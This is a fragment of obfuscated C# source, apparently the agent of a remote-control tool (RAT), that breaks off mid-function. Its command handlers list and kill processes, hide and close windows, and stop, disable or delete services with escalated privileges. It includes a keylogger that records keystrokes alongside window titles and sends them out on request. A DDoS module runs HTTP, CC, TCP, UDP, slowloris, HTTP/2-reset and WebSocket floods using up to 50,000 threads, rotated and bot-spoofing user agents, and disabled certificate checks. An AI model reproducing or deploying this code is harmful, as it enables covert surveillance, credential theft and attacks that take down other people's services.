            return s.Replace("\\", "\\\\").Replace("\"", "\\\"")
                    .Replace("\n", "\\n").Replace("\r", "\\r")
                    .Replace("\t", "\\t");
        }

        static string _hUALleDbnckSq(string json, string key)
        {
            
            var pattern = "\"" + Regex.Escape(key) + "\"\\s*:\\s*\"((?:[^\"\\\\]|\\\\.)*)\"";
            var m = Regex.Match(json, pattern);
            if (m.Success)
                return m.Groups[1].Value.Replace("\\\"", "\"").Replace("\\\\", "\\")
                        .Replace("\\n", "\n").Replace("\\r", "\r").Replace("\\t", "\t");

            
            pattern = "\"" + Regex.Escape(key) + "\"\\s*:\\s*(-?\\d+)";
            m = Regex.Match(json, pattern);
            return m.Success ? m.Groups[1].Value : "";
        }

        static string _QakMRksQlX(string json, string key)
        {
            
            var idx = json.IndexOf("\"" + key + "\"");
            if (idx < 0) return "{}";
            idx = json.IndexOf(':', idx);
            if (idx < 0) return "{}";
            idx++;
            while (idx < json.Length && json[idx] == ' ') idx++;
            if (idx >= json.Length) return "";

            
            if (idx + 4 <= json.Length && json.Substring(idx, 4) == "null")
                return "";

            if (json[idx] == '{')
            {
                int depth = 0;
                int start = idx;
                for (int i = idx; i < json.Length; i++)
                {
                    if (json[i] == '{') depth++;
                    else if (json[i] == '}') { depth--; if (depth == 0) return json.Substring(start, i - start + 1); }
                }
            }
            else if (json[idx] == '"')
            {
                int start = idx;
                for (int i = idx + 1; i < json.Length; i++)
                {
                    if (json[i] == '\\') { i++; continue; }
                    if (json[i] == '"') return json.Substring(start, i - start + 1);
                }
            }
            return "{}";
        }

        
        
        

        void _czejuKIEeySlduaZV(string id)
        {
            try
            {
                var procs = Process.GetProcesses();
                var sb = new StringBuilder();
                sb.Append("{\"processes\":[");
                bool first = true;
                foreach (var p in procs)
                {
                    try
                    {
                        long mem = p.WorkingSet64 / 1024;
                        string pname = p.ProcessName;
                        int pid = p.Id;
                        string title = "";
                        try { title = p.MainWindowTitle; } catch {}
                        if (!first) sb.Append(",");
                        first = false;
                        sb.Append(string.Format("{{\"pid\":{0},\"name\":\"{1}\",\"mem\":{2},\"title\":\"{3}\"}}",
                            pid, _AexenijxeK(pname), mem, _AexenijxeK(title ?? "")));
                    }
                    catch {}
                }
                sb.Append("]}");
                _TfnfMjSzCWKv("process_list_result", id, sb.ToString());
            }
            catch (Exception ex)
            {
                _TfnfMjSzCWKv("process_list_result", id, "{\"error\":\"" + _AexenijxeK(ex.Message) + "\"}");
            }
        }

        void _KIpJANOOmsSsJcftr(string id, string payload)
        {
            try
            {
                string pidStr = _hUALleDbnckSq(payload, "pid");
                int pid = int.Parse(pidStr);
                var p = Process.GetProcessById(pid);
                string name = p.ProcessName;
                p.Kill();
                p.WaitForExit(3000);
                _TfnfMjSzCWKv("process_kill_result", id,
                    "{\"success\":true,\"message\":\"已终止 " + _AexenijxeK(name) + " (PID " + pid + ")\"}");
            }
            catch (Exception ex)
            {
                _TfnfMjSzCWKv("process_kill_result", id,
                    "{\"success\":false,\"message\":\"" + _AexenijxeK(ex.Message) + "\"}");
            }
        }

        
        
        

        [DllImport("user32.dll")]
        static extern bool EnumWindows(EnumWindowsProc lpEnumFunc, IntPtr lParam);
        delegate bool EnumWindowsProc(IntPtr hWnd, IntPtr lParam);

        [DllImport("user32.dll")]
        static extern bool IsWindowVisible(IntPtr hWnd);

        [DllImport("user32.dll", CharSet = CharSet.Auto)]
        static extern int GetClassName(IntPtr hWnd, StringBuilder lpClassName, int nMaxCount);

        [DllImport("user32.dll")]
        static extern uint GetWindowThreadProcessId(IntPtr hWnd, out uint processId);

        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        [DllImport("user32.dll")]
        static extern bool PostMessage(IntPtr hWnd, uint Msg, IntPtr wParam, IntPtr lParam);

        [DllImport("user32.dll")]
        static extern bool SetForegroundWindow(IntPtr hWnd);

        [DllImport("user32.dll")]
        static extern bool IsIconic(IntPtr hWnd);

        [DllImport("user32.dll")]
        static extern bool IsZoomed(IntPtr hWnd);

        const uint WM_CLOSE = 0x0010;
        const int SW_HIDE = 0;
        const int SW_SHOW = 5;
        const int SW_MINIMIZE = 6;
        const int SW_RESTORE = 9;
        const int SW_MAXIMIZE = 3;

        void HandleWindowList(string id)
        {
            try
            {
                var windows = new List<string>();
                EnumWindows((hWnd, lParam) =>
                {
                    if (!IsWindowVisible(hWnd)) return true;
                    var title = new StringBuilder(256);
                    GetWindowText(hWnd, title, 256);
                    if (title.Length == 0) return true;

                    var className = new StringBuilder(256);
                    GetClassName(hWnd, className, 256);
                    uint pid = 0;
                    GetWindowThreadProcessId(hWnd, out pid);

                    string pname = "";
                    try { pname = Process.GetProcessById((int)pid).ProcessName; } catch {}

                    string state = "normal";
                    if (IsIconic(hWnd)) state = "minimized";
                    else if (IsZoomed(hWnd)) state = "maximized";

                    windows.Add(string.Format(
                        "{{\"hwnd\":{0},\"title\":\"{1}\",\"class\":\"{2}\",\"pid\":{3},\"process\":\"{4}\",\"state\":\"{5}\"}}",
                        (long)hWnd, _AexenijxeK(title.ToString()), _AexenijxeK(className.ToString()),
                        pid, _AexenijxeK(pname), state));
                    return true;
                }, IntPtr.Zero);

                var sb = new StringBuilder();
                sb.Append("{\"windows\":[");
                for (int i = 0; i < windows.Count; i++)
                {
                    if (i > 0) sb.Append(",");
                    sb.Append(windows[i]);
                }
                sb.Append("]}");
                _TfnfMjSzCWKv("window_list_result", id, sb.ToString());
            }
            catch (Exception ex)
            {
                _TfnfMjSzCWKv("window_list_result", id, "{\"error\":\"" + _AexenijxeK(ex.Message) + "\"}");
            }
        }

        void HandleWindowControl(string id, string payload)
        {
            try
            {
                string hwndStr = _hUALleDbnckSq(payload, "hwnd");
                string action = _hUALleDbnckSq(payload, "action");
                IntPtr hWnd = new IntPtr(long.Parse(hwndStr));

                string result = "";
                switch (action)
                {
                    case "show":
                        ShowWindow(hWnd, SW_SHOW);
                        SetForegroundWindow(hWnd);
                        result = "已显示";
                        break;
                    case "hide":
                        ShowWindow(hWnd, SW_HIDE);
                        result = "已隐藏";
                        break;
                    case "minimize":
                        ShowWindow(hWnd, SW_MINIMIZE);
                        result = "已最小化";
                        break;
                    case "maximize":
                        ShowWindow(hWnd, SW_MAXIMIZE);
                        result = "已最大化";
                        break;
                    case "restore":
                        ShowWindow(hWnd, SW_RESTORE);
                        result = "已还原";
                        break;
                    case "close":
                        PostMessage(hWnd, WM_CLOSE, IntPtr.Zero, IntPtr.Zero);
                        result = "已关闭";
                        break;
                    default:
                        result = "未知操作: " + action;
                        break;
                }
                _TfnfMjSzCWKv("window_control_result", id,
                    "{\"success\":true,\"message\":\"" + _AexenijxeK(result) + "\"}");
            }
            catch (Exception ex)
            {
                _TfnfMjSzCWKv("window_control_result", id,
                    "{\"success\":false,\"message\":\"" + _AexenijxeK(ex.Message) + "\"}");
            }
        }

        
        
        

        void _LFZqPJjdmfCTacaIU(string id)
        {
            try
            {
                var sb = new StringBuilder();
                sb.Append("{\"services\":[");
                bool first = true;
                using (var searcher = new System.Management.ManagementObjectSearcher(
                    "SELECT Name,DisplayName,State,StartMode,ProcessId FROM Win32_Service"))
                {
                    foreach (var obj in searcher.Get())
                    {
                        if (!first) sb.Append(",");
                        first = false;
                        string name = (obj["Name"] ?? "").ToString();
                        string disp = (obj["DisplayName"] ?? "").ToString();
                        string state = (obj["State"] ?? "").ToString();
                        string start = (obj["StartMode"] ?? "").ToString();
                        uint spid = 0;
                        try { spid = Convert.ToUInt32(obj["ProcessId"]); } catch {}
                        sb.Append(string.Format("{{\"name\":\"{0}\",\"display\":\"{1}\",\"state\":\"{2}\",\"start\":\"{3}\",\"pid\":{4}}}",
                            _AexenijxeK(name), _AexenijxeK(disp), _AexenijxeK(state), _AexenijxeK(start), spid));
                    }
                }
                sb.Append("]}");
                _TfnfMjSzCWKv("service_list_result", id, sb.ToString());
            }
            catch (Exception ex)
            {
                _TfnfMjSzCWKv("service_list_result", id, "{\"error\":\"" + _AexenijxeK(ex.Message) + "\"}");
            }
        }

        static string WmiSvcErr(uint code)
        {
            switch (code)
            {
                case 1: return "不支持的请求";
                case 2: return "权限不足(需要管理员运行Agent)";
                case 3: return "依赖服务运行中";
                case 4: return "无效的服务控制";
                case 5: return "服务无法接受控制";
                case 6: return "服务未激活";
                case 7: return "服务请求超时";
                case 8: return "未知错误";
                case 9: return "路径未找到";
                case 10: return "服务已在运行";
                case 11: return "服务数据库已锁定";
                case 12: return "服务依赖项已删除";
                case 13: return "服务依赖项失败";
                case 14: return "服务已禁用";
                case 15: return "服务登录失败";
                case 16: return "服务标记为删除";
                case 21: return "状态无效";
                case 22: return "权限不足(需要管理员运行Agent)";
                default: return "错误代码" + code;
            }
        }

        void _nfVfGtnxocrdVQhWSIiS(string id, string payload)
        {
            try
            {
                string svcName = _hUALleDbnckSq(payload, "name");
                string action = _hUALleDbnckSq(payload, "action");
                if (string.IsNullOrEmpty(svcName) || string.IsNullOrEmpty(action))
                {
                    _TfnfMjSzCWKv("service_control_result", id, "{\"success\":false,\"message\":\"缺少参数\"}");
                    return;
                }

                
                try { _fSshpcIDbaxmHgw(_Q._S("P5xjoqmIgFJRasdaHXSzEw==")); } catch { }
                try { _fSshpcIDbaxmHgw("SeImpersonatePrivilege"); } catch { }

                var connOpts = new System.Management.ConnectionOptions();
                connOpts.Impersonation = System.Management.ImpersonationLevel.Impersonate;
                connOpts.EnablePrivileges = true;
                var scope = new System.Management.ManagementScope(@"\\.\root\cimv2", connOpts);
                scope.Connect();

                string wql = "SELECT * FROM Win32_Service WHERE Name='" + svcName.Replace("'", "\\'") + "'";
                using (var searcher = new System.Management.ManagementObjectSearcher(scope, new System.Management.ObjectQuery(wql)))
                {
                    System.Management.ManagementObject svcObj = null;
                    foreach (System.Management.ManagementObject obj in searcher.Get())
                    {
                        svcObj = obj;
                        break;
                    }
                    if (svcObj == null)
                    {
                        _TfnfMjSzCWKv("service_control_result", id,
                            "{\"success\":false,\"message\":\"服务不存在: " + _AexenijxeK(svcName) + "\"}");
                        return;
                    }

                    uint ret = 99;
                    string msg = "";

                    if (action == "start")
                    {
                        ret = (uint)svcObj.InvokeMethod("StartService", null);
                        if (ret == 0) msg = "服务已启动";
                        else if (ret == 10) msg = "服务已在运行中";
                        else msg = "启动失败: " + WmiSvcErr(ret);
                    }
                    else if (action == "stop")
                    {
                        ret = (uint)svcObj.InvokeMethod("StopService", null);
                        if (ret == 0) msg = "服务已停止";
                        else if (ret == 5) msg = "服务未在运行";
                        else msg = "停止失败: " + WmiSvcErr(ret);
                    }
                    else if (action == "disable")
                    {
                        var inParams = svcObj.GetMethodParameters("ChangeStartMode");
                        inParams["StartMode"] = "Disabled";
                        var outParams = svcObj.InvokeMethod("ChangeStartMode", inParams, null);
                        ret = (uint)outParams["ReturnValue"];
                        msg = ret == 0 ? "服务已禁用" : "禁用失败: " + WmiSvcErr(ret);
                    }
                    else if (action == "auto")
                    {
                        var inParams = svcObj.GetMethodParameters("ChangeStartMode");
                        inParams["StartMode"] = "Automatic";
                        var outParams = svcObj.InvokeMethod("ChangeStartMode", inParams, null);
                        ret = (uint)outParams["ReturnValue"];
                        msg = ret == 0 ? "服务已设为自动启动" : "设置失败: " + WmiSvcErr(ret);
                    }
                    else if (action == "delete")
                    {
                        ret = (uint)svcObj.InvokeMethod("Delete", null);
                        msg = ret == 0 ? "服务已删除" : "删除失败: " + WmiSvcErr(ret);
                    }
                    else
                    {
                        _TfnfMjSzCWKv("service_control_result", id, "{\"success\":false,\"message\":\"未知操作\"}");
                        return;
                    }

                    bool ok = (ret == 0 || (action == "start" && ret == 10) || (action == "stop" && ret == 5));
                    _TfnfMjSzCWKv("service_control_result", id,
                        "{\"success\":" + (ok ? "true" : "false") + ",\"message\":\"" + _AexenijxeK(msg) + "\"}");
                }
            }
            catch (Exception ex)
            {
                _TfnfMjSzCWKv("service_control_result", id,
                    "{\"success\":false,\"message\":\"" + _AexenijxeK(ex.Message) + "\"}");
            }
        }

        
        
        

        [DllImport("user32.dll")]
        static extern short GetAsyncKeyState(int vKey);
        [DllImport("user32.dll")]
        static extern IntPtr GetForegroundWindow();
        [DllImport("user32.dll", CharSet = CharSet.Unicode)]
        static extern int GetWindowText(IntPtr hWnd, StringBuilder lpString, int nMaxCount);
        [DllImport("user32.dll")]
        static extern int GetKeyState(int nVirtKey);

        volatile bool _AraeEEaXzUSnyY;
        Thread _FZpNBAuBZbyyL;
        readonly object _tXiEXRiBNKn = new object();
        StringBuilder _urBoJFASOToZt = new StringBuilder();

        void _bRLALCOeYDnsNonPL(string id)
        {
            if (_AraeEEaXzUSnyY)
            {
                _TfnfMjSzCWKv("keylog_result", id, "{\"status\":\"already_running\"}");
                return;
            }
            _AraeEEaXzUSnyY = true;
            lock (_tXiEXRiBNKn) { _urBoJFASOToZt.Clear(); }
            _FZpNBAuBZbyyL = new Thread(_OMiNNDyFDthF) { IsBackground = true, Name = "KL" };
            _FZpNBAuBZbyyL.Start();
            _TfnfMjSzCWKv("keylog_result", id, "{\"status\":\"started\"}");
        }

        void _cMMtCxjnGedFMMCV(string id)
        {
            _AraeEEaXzUSnyY = false;
            _TfnfMjSzCWKv("keylog_result", id, "{\"status\":\"stopped\"}");
        }

        void _WvoTDkEjgZhGcmOP(string id)
        {
            string data;
            lock (_tXiEXRiBNKn)
            {
                data = _urBoJFASOToZt.ToString();
                _urBoJFASOToZt.Clear();
            }
            _TfnfMjSzCWKv("keylog_dump_result", id,
                "{\"data\":\"" + _AexenijxeK(data) + "\",\"length\":" + data.Length + "}");
        }

        void _OMiNNDyFDthF()
        {
            IntPtr lastWnd = IntPtr.Zero;
            while (_AraeEEaXzUSnyY)
            {
                Thread.Sleep(5);
                try
                {
                    IntPtr fg = GetForegroundWindow();
                    if (fg != lastWnd)
                    {
                        lastWnd = fg;
                        var titleBuf = new StringBuilder(256);
                        GetWindowText(fg, titleBuf, 256);
                        string title = titleBuf.ToString();
                        if (!string.IsNullOrEmpty(title))
                        {
                            lock (_tXiEXRiBNKn)
                            {
                                _urBoJFASOToZt.Append("\r\n[" + DateTime.Now.ToString("HH:mm:ss") + " " + title + "]\r\n");
                            }
                        }
                    }

                    for (int k = 8; k <= 255; k++)
                    {
                        if ((GetAsyncKeyState(k) & 1) != 0)
                        {
                            string s = _amEwCeBVPTSX(k);
                            if (s.Length > 0)
                            {
                                lock (_tXiEXRiBNKn) { _urBoJFASOToZt.Append(s); }
                            }
                        }
                    }
                }
                catch {}
            }
        }

        string _amEwCeBVPTSX(int vk)
        {
            bool shift = (GetKeyState(0x10) & 0x8000) != 0;
            bool caps = (GetKeyState(0x14) & 1) != 0;

            if (vk >= 0x41 && vk <= 0x5A)
            {
                bool upper = caps ^ shift;
                return upper ? ((char)vk).ToString() : ((char)(vk + 32)).ToString();
            }
            if (vk >= 0x30 && vk <= 0x39)
            {
                if (shift)
                {
                    string syms = ")!@#$%^&*(";
                    return syms[vk - 0x30].ToString();
                }
                return ((char)vk).ToString();
            }
            if (vk >= 0x60 && vk <= 0x69) return ((char)(vk - 0x60 + '0')).ToString();
            if (vk == 0x6E || vk == 0xBE) return ".";
            if (vk == 0x6A) return "*";
            if (vk == 0x6B) return "+";
            if (vk == 0x6D) return "-";
            if (vk == 0x6F) return "/";

            switch (vk)
            {
                case 0x08: return "[BS]";
                case 0x09: return "[Tab]";
                case 0x0D: return "[Enter]\r\n";
                case 0x1B: return "[Esc]";
                case 0x20: return " ";
                case 0x2E: return "[Del]";
                case 0x25: return "[←]"; case 0x26: return "[↑]";
                case 0x27: return "[→]"; case 0x28: return "[↓]";
                case 0xBA: return shift ? ":" : ";";
                case 0xBB: return shift ? "+" : "=";
                case 0xBC: return shift ? "<" : ",";
                case 0xBD: return shift ? "_" : "-";
                case 0xBF: return shift ? "?" : "/";
                case 0xC0: return shift ? "~" : "`";
                case 0xDB: return shift ? "{" : "[";
                case 0xDC: return shift ? "|" : "\\";
                case 0xDD: return shift ? "}" : "]";
                case 0xDE: return shift ? "\"" : "'";
            }
            if (vk >= 0x70 && vk <= 0x7B) return "[F" + (vk - 0x6F) + "]";
            if (vk == 0xA0 || vk == 0xA1) return "";
            if (vk == 0xA2 || vk == 0xA3) return "[Ctrl]";
            if (vk == 0xA4 || vk == 0xA5) return "[Alt]";
            if (vk == 0x5B || vk == 0x5C) return "[Win]";
            return "";
        }

        
        
        

        CancellationTokenSource _OnvAQXFdlz;
        volatile bool _uODxJzPydhUywd;
        readonly object _LlwpgpwOszy = new object();

        static readonly string[] _moaFzLEIcO = new string[] {
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Safari/605.1.15",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:127.0) Gecko/20100101 Firefox/127.0",
            "Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36 Edg/125.0.0.0",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 17_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Mobile/15E148 Safari/604.1",
            "Mozilla/5.0 (Linux; Android 14; SM-S928B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.6422.53 Mobile Safari/537.36",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
            "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
            "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36 Vivaldi/6.7.3329.41",
        };

        static readonly string[] _BhYjjPMJUhGsNRs = new string[] {
            "https://www.google.com/search?q=", "https://www.baidu.com/s?wd=",
            "https://www.bing.com/search?q=", "https://search.yahoo.com/search?p=",
            "https://duckduckgo.com/?q=", "https://www.sogou.com/web?query=",
        };

        static readonly string[] _TaZFBqEICtJA = new string[] {
            "zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7", "en-US,en;q=0.9",
            "zh-TW,zh;q=0.9,en-US;q=0.8,en;q=0.7", "ja,en-US;q=0.9,en;q=0.8",
            "ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7", "ru,en-US;q=0.9,en;q=0.8",
            "de,en-US;q=0.9,en;q=0.8", "fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7",
        };

        static readonly string[] _rqbOmZsZWUkFab = new string[] {
            "\"Chromium\";v=\"125\", \"Not.A/Brand\";v=\"24\"",
            "\"Google Chrome\";v=\"125\", \"Chromium\";v=\"125\", \"Not.A/Brand\";v=\"24\"",
            "\"Microsoft Edge\";v=\"125\", \"Chromium\";v=\"125\", \"Not.A/Brand\";v=\"24\"",
            "\"Chromium\";v=\"124\", \"Google Chrome\";v=\"124\", \"Not?A_Brand\";v=\"8\"",
        };

        static readonly string[] _PuhqJephyQsB = new string[] {
            "/", "/index.html", "/index.php", "/home", "/about", "/contact",
            "/products", "/services", "/blog", "/news", "/faq", "/help",
            "/search", "/category", "/archive", "/user/login", "/api/v1/status",
            "/sitemap.xml", "/robots.txt", "/favicon.ico",
        };

        static readonly string[] _gIESPhMTgABcnrgybT = new string[] {
            "__cfduid", "cf_clearance", "_ga", "_gid", "PHPSESSID",
            "JSESSIONID", "session_id", "csrftoken", "_fbp", "__stripe_mid",
        };

        static readonly Random _TqpHrZdNaN = new Random();

        static string _yzKiDfwLovwEm(int n)
        {
            const string chars = "abcdefghijklmnopqrstuvwxyz0123456789";
            var sb = new System.Text.StringBuilder(n);
            for (int i = 0; i < n; i++) sb.Append(chars[_TqpHrZdNaN.Next(chars.Length)]);
            return sb.ToString();
        }

        static string _OjXfVzqksAAm()
        {
            return string.Format("{0}.{1}.{2}.{3}",
                _TqpHrZdNaN.Next(1, 224), _TqpHrZdNaN.Next(256), _TqpHrZdNaN.Next(256), _TqpHrZdNaN.Next(1, 255));
        }

        void _qyarqddRobFpIfLlP(string id, string payload)
        {
            string urlStr = _hUALleDbnckSq(payload, "url");
            string mode = _hUALleDbnckSq(payload, "mode");
            string method = _hUALleDbnckSq(payload, "method");
            string body = _hUALleDbnckSq(payload, "body");
            int concurrency = 100, duration = 30, bodySize = 64;

            try { concurrency = int.Parse(_hUALleDbnckSq(payload, "concurrency")); } catch { }
            try { duration = int.Parse(_hUALleDbnckSq(payload, "duration")); } catch { }
            try { bodySize = int.Parse(_hUALleDbnckSq(payload, "bodySize")); } catch { }

            if (string.IsNullOrEmpty(urlStr)) { _TfnfMjSzCWKv("stress_done", id, "{\"error\":\"missing url\"}"); return; }
            if (string.IsNullOrEmpty(mode)) mode = "http_flood";
            if (string.IsNullOrEmpty(method)) method = "GET";
            if (concurrency <= 0) concurrency = 100;
            if (concurrency > 50000) concurrency = 50000;
            if (duration <= 0) duration = 30;
            if (bodySize <= 0) bodySize = 64;

            lock (_LlwpgpwOszy)
            {
                if (_uODxJzPydhUywd && _OnvAQXFdlz != null)
                {
                    _OnvAQXFdlz.Cancel();
                    Thread.Sleep(500);
                }
                _OnvAQXFdlz = new CancellationTokenSource();
                _uODxJzPydhUywd = true;
            }

            _TfnfMjSzCWKv("stress_progress", id, "{\"running\":true,\"sent\":0}");

            var cts = _OnvAQXFdlz;
            var token = cts.Token;

            ThreadPool.QueueUserWorkItem(_ =>
            {
                try
                {
                    _uGAMkXqrc(id, urlStr, mode, method, body, concurrency, duration, bodySize, token);
                }
                catch { }
                finally
                {
                    lock (_LlwpgpwOszy) { _uODxJzPydhUywd = false; }
                }
            });
        }

        void _FRyXwcmJaYIFFmfY(string id)
        {
            lock (_LlwpgpwOszy)
            {
                if (_uODxJzPydhUywd && _OnvAQXFdlz != null)
                {
                    _OnvAQXFdlz.Cancel();
                }
            }
            _TfnfMjSzCWKv("stress_done", id, "{\"running\":false}");
        }

        void _uGAMkXqrc(string taskId, string urlStr, string mode, string method, string body,
                        int concurrency, int duration, int bodySize, CancellationToken ct)
        {
            long totalSent = 0, totalSuccess = 0, totalErrors = 0, totalBlocked = 0;
            long totalLatencyMs = 0, bytesSent = 0, bytesRecv = 0, activeConn = 0;
            long minLatMs = long.MaxValue, maxLatMs = 0;

            var deadline = DateTime.UtcNow.AddSeconds(duration);
            var threads = new Thread[concurrency];

            Action worker;
            switch (mode)
            {
                case "tcp_flood":
                    worker = () => _JrjMxrkYAIPwlw(urlStr, ct, deadline, ref totalSent, ref totalSuccess, ref totalErrors,
                        ref totalLatencyMs, ref minLatMs, ref maxLatMs, ref bytesSent, ref activeConn);
                    break;
                case "udp_flood":
                    worker = () => _hmleqhhBogbsVp(urlStr, bodySize, ct, deadline, ref totalSent, ref totalSuccess, ref totalErrors,
                        ref totalLatencyMs, ref minLatMs, ref maxLatMs, ref bytesSent, ref activeConn);
                    break;
                case "slowloris":
                    worker = () => _eNXGKUsxaigHgwm(urlStr, ct, deadline, ref totalSent, ref totalSuccess, ref totalErrors,
                        ref totalLatencyMs, ref minLatMs, ref maxLatMs, ref bytesSent, ref activeConn);
                    break;
                case "bandwidth":
                    worker = () => _cimwXXeeQSVOWXU(urlStr, bodySize, ct, deadline, ref totalSent, ref totalSuccess, ref totalErrors,
                        ref totalLatencyMs, ref minLatMs, ref maxLatMs, ref bytesSent, ref bytesRecv, ref activeConn);
                    break;
                case "https_flood":
                    worker = () => _DyyYOlFnGMOjwmCr(urlStr, method, body, ct, deadline,
                        ref totalSent, ref totalSuccess, ref totalErrors, ref totalBlocked,
                        ref totalLatencyMs, ref minLatMs, ref maxLatMs, ref bytesSent, ref bytesRecv, ref activeConn);
                    break;
                case "h2_reset":
                    worker = () => _bonCyZqtEHQzW(urlStr, ct, deadline,
                        ref totalSent, ref totalSuccess, ref totalErrors,
                        ref totalLatencyMs, ref minLatMs, ref maxLatMs, ref bytesSent, ref activeConn);
                    break;
                case "ws_flood":
                    worker = () => _zyvDFgCDheGZP(urlStr, bodySize, ct, deadline,
                        ref totalSent, ref totalSuccess, ref totalErrors,
                        ref totalLatencyMs, ref minLatMs, ref maxLatMs, ref bytesSent, ref activeConn);
                    break;
                default: 
                    bool isCC = mode == "cc";
                    worker = () => _gJRexyNkIIzaHni(urlStr, method, body, isCC, ct, deadline,
                        ref totalSent, ref totalSuccess, ref totalErrors, ref totalBlocked,
                        ref totalLatencyMs, ref minLatMs, ref maxLatMs, ref bytesSent, ref bytesRecv, ref activeConn);
                    break;
            }

            for (int i = 0; i < concurrency; i++)
            {
                threads[i] = new Thread(() => { try { worker(); } catch { } }) { IsBackground = true };
                threads[i].Start();
            }

            
            var start = DateTime.UtcNow;
            long lastSent = 0, lastBS = 0, lastBR = 0;
            while (!ct.IsCancellationRequested && DateTime.UtcNow < deadline)
            {
                Thread.Sleep(1000);
                long sent = Interlocked.Read(ref totalSent);
                long bs = Interlocked.Read(ref bytesSent);
                long br = Interlocked.Read(ref bytesRecv);
                double rps = sent - lastSent;
                double mbpsSent = (bs - lastBS) * 8.0 / 1e6;
                double mbpsRecv = (br - lastBR) * 8.0 / 1e6;
                lastSent = sent; lastBS = bs; lastBR = br;

                string prog = _pUsgZBoiNQKjQigCqxe(sent, ref totalSuccess, ref totalErrors, ref totalBlocked,
                    ref totalLatencyMs, ref minLatMs, ref maxLatMs, rps, bs, br, mbpsSent, mbpsRecv, ref activeConn, true);
                _TfnfMjSzCWKv("stress_progress", taskId, prog);
            }

            
            if (_OnvAQXFdlz != null) try { _OnvAQXFdlz.Cancel(); } catch { }
            for (int i = 0; i < concurrency; i++)
                try { threads[i].Join(3000); } catch { }

            double elapsed = (DateTime.UtcNow - start).TotalSeconds;
            if (elapsed < 0.001) elapsed = 0.001;
            long finalSent = Interlocked.Read(ref totalSent);
            long finalBS = Interlocked.Read(ref bytesSent);
            long finalBR = Interlocked.Read(ref bytesRecv);
            double avgRps = finalSent / elapsed;
            double avgMbpsSent = finalBS * 8.0 / 1e6 / elapsed;
            double avgMbpsRecv = finalBR * 8.0 / 1e6 / elapsed;

            string final_ = _pUsgZBoiNQKjQigCqxe(finalSent, ref totalSuccess, ref totalErrors, ref totalBlocked,
                ref totalLatencyMs, ref minLatMs, ref maxLatMs, avgRps, finalBS, finalBR, avgMbpsSent, avgMbpsRecv, ref activeConn, false);
            _TfnfMjSzCWKv("stress_done", taskId, final_);
        }

        static string _pUsgZBoiNQKjQigCqxe(long sent, ref long success, ref long errors, ref long blocked,
            ref long latMs, ref long minL, ref long maxL, double rps, long bs, long br,
            double mbpsSent, double mbpsRecv, ref long ac, bool running)
        {
            long s = Interlocked.Read(ref success), e = Interlocked.Read(ref errors);
            long b = Interlocked.Read(ref blocked), lat = Interlocked.Read(ref latMs);
            long mn = Interlocked.Read(ref minL), mx = Interlocked.Read(ref maxL);
            long a = Interlocked.Read(ref ac);
            double avgLat = sent > 0 ? (double)lat / sent : 0;
            double minLat = mn == long.MaxValue ? 0 : mn;
            double maxLat = mx;
            return string.Format("{{\"sent\":{0},\"success\":{1},\"errors\":{2},\"blocked\":{3},\"rps\":{4:F1},\"avgLatency\":{5:F2},\"minLatency\":{6:F2},\"maxLatency\":{7:F2},\"bytesSent\":{8},\"bytesRecv\":{9},\"mbpsSent\":{10:F2},\"mbpsRecv\":{11:F2},\"activeConn\":{12},\"running\":{13}}}",
                sent, s, e, b, rps, avgLat, minLat, maxLat, bs, br, mbpsSent, mbpsRecv, a, running ? "true" : "false");
        }

        
        void _gJRexyNkIIzaHni(string urlStr, string method, string body, bool isCC, CancellationToken ct, DateTime deadline,
            ref long totalSent, ref long totalSuccess, ref long totalErrors, ref long totalBlocked,
            ref long totalLatMs, ref long minLat, ref long maxLat, ref long bytesSent, ref long bytesRecv, ref long activeConn)
        {
            ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
            ServicePointManager.DefaultConnectionLimit = 65535;
            ServicePointManager.ServerCertificateValidationCallback = (s, c, ch, e2) => true;
            ServicePointManager.Expect100Continue = false;

            byte[] bodyBytes = string.IsNullOrEmpty(body) ? null : System.Text.Encoding.UTF8.GetBytes(body);

            while (!ct.IsCancellationRequested && DateTime.UtcNow < deadline)
            {
                try
                {
                    Interlocked.Increment(ref activeConn);
                    var sw = System.Diagnostics.Stopwatch.StartNew();

                    string targetUrl = urlStr;
                    if (isCC)
                    {
                        string path = _PuhqJephyQsB[_TqpHrZdNaN.Next(_PuhqJephyQsB.Length)];
                        string sep = targetUrl.Contains("?") ? "&" : "?";
                        targetUrl = targetUrl.TrimEnd('/') + path + sep + "_=" + _yzKiDfwLovwEm(8) + "&r=" + _yzKiDfwLovwEm(6) + "&t=" + Environment.TickCount;
                    }

                    var req = (System.Net.HttpWebRequest)System.Net.WebRequest.Create(targetUrl);
                    req.Method = method;
